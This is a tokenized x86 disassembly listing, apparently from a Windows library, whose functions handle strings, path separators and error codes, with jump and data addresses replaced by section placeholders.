jmp r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x20 ]
push eax
push esi
lea edx [ ecx + ebx * 2 ]
push edx
push ebp
call sub_100260e0
add esp 0x10
mov eax esi
cmp [ edi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp edi 0xfffffffc
je r-xdata
lea edx [ eax + edx * 2 ]
cmp ebx edx
jbe r-xdata
mov ecx [ edi + 0x14 ]
lea edx [ esi + ecx * 2 ]
cmp ebp edx
jb r-xdata
mov esi [ esi ]
cmp ecx 0x8
jb r-xdata
cmp eax ebp
ja r-xdata
call sub_10027827
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp edi 0xfffffffc
je r-xdata
lea eax [ eax + ebx * 2 ]
cmp ebp eax
jbe r-xdata
sub_10023df0
push ecx
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] 0x0
call sub_100259a0
mov eax [ eax ]
mov edi [ esp + 0x10 ]
push eax
push edi
mov ecx esi
call sub_10023c90
mov eax edi
pop edi
pop esi
pop ecx
retn 0x4
sub_10023e20
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e3e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov edi [ esi + 0x4c ]
test edi edi
jne r-xdata
cmp [ edi + 0x4c ] 0x0
mov [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_10023590
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ esi + 0x4c ]
add esi 0x38
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx esi
call sub_10023590
mov ecx eax
lea ebx [ ecx + 0x1 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx ebx
push ecx
push eax
lea ecx [ edi + 0x38 ]
call sub_10001e2d
mov eax [ esi + 0x4c ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
push 0x3
push r--data
lea ecx [ eax + 0x38 ]
call sub_100072a4
mov ecx [ esi + 0x4c ]
lea eax [ ebp - 0x4c ]
push eax
call sub_10023df0
mov ecx [ esi + 0x4c ]
push 0xffffffff
push 0x0
push eax
add ecx 0x38
mov [ ebp - 0x4 ] 0x1
call sub_100071fd
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
push 0x3
push r--data
lea ecx [ eax + 0x38 ]
call sub_100072a4
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x30 ]
push edx
lea ecx [ eax + 0x1c ]
call sub_10023df0
mov ecx [ esi + 0x4c ]
push 0xffffffff
push 0x0
push eax
add ecx 0x38
mov [ ebp - 0x4 ] 0x2
call sub_100071fd
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
mov eax [ esi + 0x4c ]
push 0x1
push r--data
lea ecx [ eax + 0x38 ]
call sub_100072a4
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100272e8
add esp 0x4
mov eax [ esi + 0x4c ]
push 0x1
push r--data
lea ecx [ eax + 0x38 ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_100072a4
mov eax [ ebp - 0x2c ]
push eax
call sub_100272e8
add esp 0x4
sub_10023fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e41e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
push ecx
push edx
mov ecx edi
call sub_10023440
xor ebx ebx
lea esi [ edi + 0x4c ]
mov [ edi ] r--data
mov [ esi ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
push 0x54
mov [ ebp - 0x4 ] 0x2
call sub_1002738b
mov ecx eax
add esp 0x4
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] 0x3
cmp ecx ebx
je r-xdata
xor eax eax
call sub_10023330
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10023b60
mov eax [ ebp + 0xc ]
mov ecx [ esi ]
push 0xffffffff
push ebx
push eax
call sub_1000253c
jmp r-xdata
sub_100240a0
push 0xffffffff
push sub_1004e448
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov edi [ esp + 0x20 ]
push edi
call sub_10001db8
mov [ esi ] r--data
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov ecx [ edi + 0x2c ]
xor edx edx
mov [ esi + 0x2c ] ecx
push 0xffffffff
lea ecx [ esi + 0x30 ]
lea eax [ edi + 0x30 ]
push edx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
push eax
mov [ esp + 0x24 ] edx
mov [ ecx + 0x4 ] dl
call sub_100021c3
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_10024120
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_100240a0
mov [ esi ] r--data
mov eax [ edi + 0x4c ]
mov [ esi + 0x4c ] eax
mov eax [ edi + 0x50 ]
mov [ esi + 0x50 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
add eax 0x4
mov ecx 0x1
[ eax ] ecx
sub_10024160
sub esp 0x54
push ebx
mov bl [ esp + 0x5c ]
push esi
test bl bl
jne r-xdata
mov eax [ esp + 0x6c ]
test eax eax
jne r-xdata
mov esi [ esp + 0x6c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x64 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp + 0x64 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov eax [ esp + 0x68 ]
push ecx
mov ecx [ esp + 0x74 ]
push edx
push eax
push ecx
lea ecx [ esp + 0x18 ]
call sub_10023fe0
push r--data
lea edx [ esp + 0xc ]
push edx
call sub_1002ae74
pop esi
mov al bl
pop ebx
add esp 0x54
retn
mov [ esi ] 0x0
call sub_10026670
mov [ esi + 0x4 ] eax
pop esi
mov al bl
pop ebx
add esp 0x54
retn
sub_100241e0
push 0xffffffff
push sub_1004e499
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc0 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0xe8 ]
mov edi [ esp + 0xec ]
xor ebx ebx
xor eax eax
mov [ esp + 0xd0 ] 0x7
mov [ esp + 0xcc ] ebx
mov [ esp + 0xbc ] ax
mov [ esp + 0xe0 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
call sub_10026670
mov eax [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
lea ecx [ esp + 0xc0 ]
push ecx
add eax 0x24
push eax
lea edx [ esp + 0x34 ]
push edx
call sub_10023920
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0x14
neg ecx
sbb ecx ecx
mov [ esp + 0x20 ] eax
test ecx sub_10023060
jne r-xdata
mov ecx esi
call sub_10023150
cmp edi ebx
jne r-xdata
lea ebp [ ebx + 0x8 ]
lea esp [ esp ]
call sub_10026670
mov esi eax
call [ GetLastError@IAT ]
lea ecx [ esp + 0xb8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] esi
mov [ esp + 0xe0 ] 0xffffffff
call sub_10002699
jmp r-xdata
push r--data
lea ecx [ esp + 0x30 ]
call sub_10001ebc
mov ecx [ esi ]
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0xe4 ] 0x1
call sub_10025bb0
mov esi eax
mov [ esp + 0xe0 ] 0x2
call sub_10026670
mov edi eax
call [ GetLastError@IAT ]
push edi
push eax
push esi
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x74 ]
call sub_10023fe0
push r--data
lea ecx [ esp + 0x68 ]
push ecx
call sub_1002ae74
mov eax [ esi ]
cmp [ eax + 0x24 ] ebx
je r-xdata
mov [ edi ] ebx
call sub_10026670
mov [ edi + 0x4 ] eax
mov ecx [ esp + 0xd8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xc0 ]
xor ecx esp
call sub_10027150
add esp 0xd0
retn
mov ecx esi
call sub_10023150
jmp r-xdata
mov eax [ esp + 0xbc ]
cmp [ esp + 0xd0 ] ebp
jae r-xdata
cmp [ esp + 0xd0 ] ebp
jb r-xdata
cmp [ eax ] 0x2e
jne r-xdata
lea eax [ esp + 0xbc ]
mov edx [ esp + 0xbc ]
push edx
call sub_100272e8
add esp 0x4
push ebx
lea eax [ esp + 0xbc ]
push eax
lea ecx [ esp + 0x34 ]
call sub_1000c5a1
mov esi [ esi ]
mov ecx esi
mov [ esp + 0xe0 ] 0x3
call sub_10025050
lea ecx [ esp + 0x2c ]
push ecx
mov ecx esi
call sub_10025780
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov [ esi + 0x1c ] edx
mov [ esi + 0x20 ] eax
cmp [ esp + 0x44 ] ebp
jb r-xdata
mov ecx [ esp + 0xcc ]
cmp ecx 0x1
je r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_100272e8
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
lea ecx [ esp + 0xc0 ]
push ecx
add eax 0x24
push eax
lea edx [ esp + 0x34 ]
push edx
call sub_10023920
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0x14
neg ecx
sbb ecx ecx
mov [ esp + 0x20 ] eax
test ecx sub_10023060
je r-xdata
jae r-xdata
cmp edi ebx
je r-xdata
mov eax [ esp + 0xbc ]
cmp [ esp + 0xd0 ] ebp
jae r-xdata
call sub_10027827
mov ecx [ esp + 0xcc ]
cmp [ eax + 0x2 ] 0x2e
jne r-xdata
lea eax [ esp + 0xbc ]
cmp ecx 0x2
jne r-xdata
sub_10024490
push 0xffffffff
push sub_1004e50f
mov eax [ fs : 0x0 ]
push eax
sub esp 0xdc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xd8 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xf0 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x100 ]
mov esi [ esp + 0x104 ]
mov ebp [ esp + 0x108 ]
push 0x30
xor ebx ebx
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
call sub_10001e2d
cmp [ esi + 0x14 ] ebx
lea ecx [ esp + 0x28 ]
push ecx
push ebp
sete al
push esi
mov [ esp + 0x24 ] al
mov edx [ esp + 0x24 ]
push rw-data
push edx
mov [ esp + 0x10c ] ebx
call sub_10024160
add esp 0x14
cmp [ esp + 0x40 ] 0x10
mov [ esp + 0x17 ] al
mov [ esp + 0xf8 ] 0xffffffff
jb r-xdata
cmp [ esp + 0x17 ] bl
jne r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_100272e8
add esp 0x4
mov ecx [ esp + 0xf0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xd8 ]
xor ecx esp
call sub_10027150
add esp 0xe8
retn
xor ecx ecx
mov [ esp + 0xe8 ] 0x7
mov [ esp + 0xe4 ] ebx
mov [ esp + 0xd4 ] cx
cmp [ esi + 0x18 ] 0x8
mov [ esp + 0xf8 ] 0x1
mov [ esp + 0x24 ] ebx
mov [ esp + 0x18 ] ebx
jb r-xdata
lea eax [ esi + 0x4 ]
mov [ esp + 0x1c ] eax
mov edx [ esi + 0x4 ]
mov [ esp + 0x1c ] edx
jmp r-xdata
mov ecx [ esp + 0x1c ]
neg ecx
sbb ecx ecx
test ecx sub_10023060
je r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_100272e8
add esp 0x4
push ebx
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esp + 0x30 ]
call sub_10023ae0
mov eax [ edi ]
lea edx [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x28 ]
push ecx
lea edx [ esp + 0xd8 ]
push edx
lea ecx [ esp + 0x34 ]
push ecx
add eax 0x24
push eax
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x110 ] 0x2
call sub_100236c0
add esp 0x18
cmp [ esp + 0x40 ] 0x8
mov [ esp + 0xf8 ] 0x1
jb r-xdata
mov eax [ edi ]
cmp [ eax + 0x24 ] ebx
jne r-xdata
mov ecx edi
call sub_10023150
push 0x30
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
call sub_10001e2d
mov eax [ esp + 0x1c ]
mov [ esp + 0xf8 ] 0x3
cmp ebp ebx
jne r-xdata
push ebx
lea ecx [ esp + 0xd4 ]
push ecx
lea ecx [ esp + 0x4c ]
call sub_1000c5a1
lea edx [ esp + 0x44 ]
push edx
lea eax [ esp + 0x64 ]
push esi
push eax
mov [ esp + 0x104 ] 0x4
call sub_100234b0
add esp 0xc
mov esi [ edi ]
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ esp + 0x104 ] 0x5
call sub_1000253c
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x18 ]
mov [ esi + 0x1c ] ecx
lea ecx [ esp + 0x60 ]
mov [ esi + 0x20 ] edx
mov [ esp + 0xf8 ] 0x4
call sub_10002699
lea ecx [ esp + 0x44 ]
mov [ esp + 0xf8 ] 0x1
call sub_10002699
cmp [ esp + 0xe8 ] 0x8
mov eax [ esp + 0xd4 ]
jae r-xdata
mov ecx edi
call sub_10023150
jmp r-xdata
cmp [ esp + 0x40 ] 0x10
mov ecx [ esp + 0x20 ]
mov [ ebp ] eax
mov [ ebp + 0x4 ] ecx
jb r-xdata
mov edx [ esp + 0x20 ]
push edx
push eax
push esi
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x8c ]
call sub_10023fe0
push r--data
lea edx [ esp + 0x80 ]
push edx
call sub_1002ae74
cmp [ eax ] 0x2e
jne r-xdata
lea eax [ esp + 0xd4 ]
cmp [ esp + 0xe8 ] 0x8
jb r-xdata
mov edx [ esp + 0x2c ]
push edx
call sub_100272e8
add esp 0x4
jmp r-xdata
cmp [ esp + 0xe4 ] 0x1
je r-xdata
mov eax [ esp + 0xd4 ]
push eax
call sub_100272e8
add esp 0x4
push ebx
push edi
call sub_100241e0
add esp 0x8
push 0x1
lea ecx [ esp + 0xd4 ]
call sub_100230f0
cmp [ eax ] 0x2e
jne r-xdata
cmp [ esp + 0xe4 ] 0x2
jne r-xdata
sub_100247d0
push 0xffffffff
push sub_1004e548
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
mov eax [ esp + 0x20 ]
mov [ esi + 0x4 ] eax
mov [ esp + 0x14 ] 0x0
mov [ esi ] r--data
call sub_10022358
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x8
sub_10024830
push ecx
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x24 ]
push ebp
push esi
mov esi [ esp + 0x20 ]
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x24 ]
mov [ esi ] eax
xor edx edx
push edi
mov edi [ esp + 0x20 ]
mov [ ebx ] ecx
mov eax [ esi ]
cmp eax edi
setne dl
mov ebp edx
cmp eax edi
je r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn 0x1c
mov ecx [ ebx ]
cmp ecx [ esp + 0x2c ]
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esi ]
add edx 0x8
push edx
mov edx [ esp + 0x1c ]
push edx
mov edx edi
sub edx eax
push edx
push eax
push ecx
call sub_1002260b
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] edi
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
pop ecx
retn 0x1c
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ ebx ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ ebx ] 0x2
xor ebp ebp
cmp [ esi ] edi
jne r-xdata
xor eax eax
mov eax [ esi ]
lea edx [ eax + 0x1 ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn 0x1c
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_100248e0
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x38 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x40 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x3c ]
mov [ esi ] edx
push edi
mov edi [ esp + 0x48 ]
xor edx edx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x38 ]
mov [ edi ] eax
mov eax [ esi ]
cmp eax ecx
setne dl
mov ebp edx
cmp eax ecx
je r-xdata
mov ecx [ esp + 0x28 ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
xor ecx esp
call sub_10027150
add esp 0x1c
retn 0x1c
mov eax [ esp + 0x10 ]
cmp [ edi ] eax
je r-xdata
mov ebx [ edi ]
call sub_1002d8c6
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
sub ecx ebx
add edx 0x8
cmp eax ecx
mov eax [ esp + 0x14 ]
push edx
push eax
jg r-xdata
mov ecx [ eax ]
mov eax [ esi ]
mov [ esp + 0x24 ] ecx
movzx ecx [ eax ]
push ecx
lea edx [ esp + 0x2c ]
push edx
call sub_100222d1
mov ebx eax
add esp 0x10
test ebx ebx
jl r-xdata
mov ecx [ esi ]
movzx edx [ ecx ]
push edx
push ebx
call sub_100222d1
add esp 0x10
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
mov ecx [ esp + 0x18 ]
xor ecx esp
call sub_10027150
add esp 0x1c
retn 0x1c
mov ecx [ edi ]
mov eax [ esp + 0x10 ]
sub eax ecx
cmp eax ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov [ edx ] ecx
push ebx
lea edx [ esp + 0x24 ]
push edx
push eax
push ecx
call sub_100272f3
add [ esi ] 0x2
add esp 0x10
add [ edi ] ebx
mov eax [ esp + 0x38 ]
xor ebp ebp
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_10024a00
sub esp 0x10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc ] eax
mov eax [ esp + 0x18 ]
push ebx
mov ebx [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x24 ]
push esi
push edi
mov edi [ esp + 0x30 ]
add ecx 0x8
push ecx
mov [ edi ] eax
mov edx [ ebx ]
push ebx
lea eax [ esp + 0x1c ]
push 0x0
push eax
mov [ esp + 0x20 ] edx
call sub_100222d1
mov esi eax
add esp 0x10
test esi esi
jg r-xdata
mov ecx [ edi ]
mov eax ebp
dec esi
sub eax ecx
cmp eax esi
jge r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
mov ecx [ esp + 0xc ]
xor ecx esp
call sub_10027150
add esp 0x10
retn 0x10
test esi esi
jle r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ ebx ] ecx
mov eax 0x1
pop ebx
mov ecx [ esp + 0xc ]
xor ecx esp
call sub_10027150
add esp 0x10
retn 0x10
mov ecx [ esp + 0x1c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
xor eax eax
call sub_10027150
add esp 0x10
retn 0x10
push esi
lea edx [ esp + 0x18 ]
push edx
push eax
push ecx
call sub_100272f3
add esp 0x10
add [ edi ] esi
sub_10024ac0
push ecx
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov ebp ecx
mov ecx [ eax ]
xor edi edi
mov [ esp + 0x10 ] ecx
cmp [ esp + 0x24 ] edi
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x10
mov ebx [ esp + 0x20 ]
lea edx [ ebp + 0x8 ]
push edx
lea eax [ esp + 0x14 ]
push eax
mov ecx ebx
sub ecx esi
push ecx
lea edx [ esp + 0x24 ]
push esi
push edx
call sub_1002260b
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ esp + 0x18 ] ax
jne r-xdata
inc edi
add esi eax
cmp edi [ esp + 0x24 ]
jb r-xdata
xor eax eax
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
cmp esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_10024b70
cmp [ esp + 0xc ] 0x0
push ebx
push ebp
push esi
push edi
jbe r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0xc
mov edx [ ecx + 0x14 ]
mov esi [ esp + 0x18 ]
cmp esi edx
jae r-xdata
mov edi [ ecx + 0x18 ]
mov [ esp + 0x18 ] edi
lea ebp [ ecx + 0x4 ]
cmp edi 0x8
jb r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
lea ebx [ eax + edx * 2 ]
cmp edi 0x8
jb r-xdata
mov edi [ esp + 0x14 ]
lea eax [ eax + esi * 2 ]
cmp eax ebx
jae r-xdata
cmp [ esp + 0x18 ] 0x8
jb r-xdata
add ecx 0x2
sub edx 0x1
jne r-xdata
pop edi
mov ecx ebp
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0xc
mov ecx [ ebp ]
pop edi
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0xc
cmp [ ecx ] si
je r-xdata
add eax 0x2
cmp eax ebx
jb r-xdata
mov edx [ esp + 0x1c ]
movzx esi [ eax ]
mov ecx edi
nop
sub_10024c00
cmp [ esp + 0xc ] 0x0
push ebx
push ebp
push esi
push edi
mov ebx ecx
jbe r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0xc
mov eax [ ebx + 0x14 ]
test eax eax
jbe r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx eax
jb r-xdata
mov eax [ ebx + 0x18 ]
mov [ esp + 0x18 ] eax
lea ebp [ ebx + 0x4 ]
cmp eax 0x8
jb r-xdata
lea ecx [ eax - 0x1 ]
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
cmp [ esp + 0x18 ] 0x8
jb r-xdata
add eax 0x2
sub ecx 0x1
jne r-xdata
mov edi [ esp + 0x14 ]
lea esi [ eax + ecx * 2 ]
pop edi
mov eax esi
mov ecx ebp
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0xc
mov ecx [ ebp ]
pop edi
mov eax esi
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0xc
cmp [ eax ] dx
je r-xdata
mov ecx ebx
call sub_1000252e
cmp esi eax
je r-xdata
sub esi 0x2
jmp r-xdata
mov ecx [ esp + 0x1c ]
movzx edx [ esi ]
mov eax edi
lea esp [ esp ]
sub_10024ca0
push esi
mov esi [ esp + 0x8 ]
mov eax esi
push edi
lea edi [ eax + 0x2 ]
jmp r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
mov eax [ esp + 0x14 ]
push eax
push esi
call sub_10024b70
pop edi
pop esi
retn 0x8
sub_10024cd0
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov ebp 0x8
cmp ebx 0x2
jne r-xdata
test ebx ebx
je r-xdata
lea edi [ esi + 0x4 ]
cmp [ esi + 0x18 ] ebp
jb r-xdata
push 0x2
lea eax [ ebx - 0x1 ]
push eax
push r--data
mov ecx esi
call sub_10024c00
cmp eax 0xffffffff
jne r-xdata
lea edi [ ebx - 0x1 ]
cmp edi [ esi + 0x14 ]
jbe r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp eax 0x1
jne r-xdata
push 0x1
add ebx 0xfffffffe
push ebx
lea ecx [ esp + 0x20 ]
push ecx
mov ecx esi
mov [ esp + 0x24 ] 0x3a
call sub_10009633
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x18 ] ebp
jb r-xdata
call sub_10027827
cmp [ esi + 0x14 ] 0x1
jae r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax ]
cmp ax 0x2f
je r-xdata
pop edi
pop esi
pop ebp
inc eax
pop ebx
retn
cmp [ esi + 0x18 ] ebp
jb r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x18 ] ebp
jb r-xdata
call sub_10027827
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
cmp ax 0x5c
jne r-xdata
movzx eax [ eax + edi * 2 ]
cmp ax 0x2f
je r-xdata
movzx eax [ edi + 0x2 ]
cmp ax 0x2f
je r-xdata
mov edi [ edi ]
cmp cx 0x5c
je r-xdata
movzx ecx [ esi ]
cmp cx 0x2f
je r-xdata
cmp ax 0x5c
jne r-xdata
sub_10024dd0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
cmp ebx 0x2
jbe r-xdata
mov ecx 0x8
cmp [ esi + 0x14 ] 0x1
jae r-xdata
cmp ebx 0x3
jbe r-xdata
lea edi [ esi + 0x4 ]
cmp [ esi + 0x18 ] ecx
jb r-xdata
mov ecx 0x8
lea edi [ esi + 0x4 ]
cmp [ esi + 0x18 ] ecx
jb r-xdata
call sub_10027827
test ebx ebx
jbe r-xdata
lea edi [ esi + 0x4 ]
cmp [ esi + 0x18 ] ecx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
or eax 0xffffffff
cmp [ esi + 0x18 ] ecx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x1
jae r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax ]
cmp ax 0x2f
je r-xdata
cmp ebx 0x2
jne r-xdata
cmp [ esi + 0x14 ] 0x2
jae r-xdata
cmp [ eax + 0x2 ] 0x3a
jne r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x1
jae r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax ]
cmp ax 0x2f
je r-xdata
cmp [ esi + 0x18 ] ecx
jb r-xdata
call sub_10027827
mov ecx 0x8
cmp [ esi + 0x18 ] ecx
jb r-xdata
call sub_10027827
mov ecx 0x8
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp ax 0x5c
jne r-xdata
movzx eax [ esi ]
cmp ax 0x2f
je r-xdata
cmp [ esi + 0x18 ] ecx
jb r-xdata
call sub_10027827
mov ecx 0x8
movzx eax [ edi + 0x2 ]
cmp ax 0x2f
je r-xdata
mov edi [ edi ]
movzx eax [ edi + 0x4 ]
cmp ax 0x2f
je r-xdata
mov edi [ edi ]
movzx eax [ edi + 0x2 ]
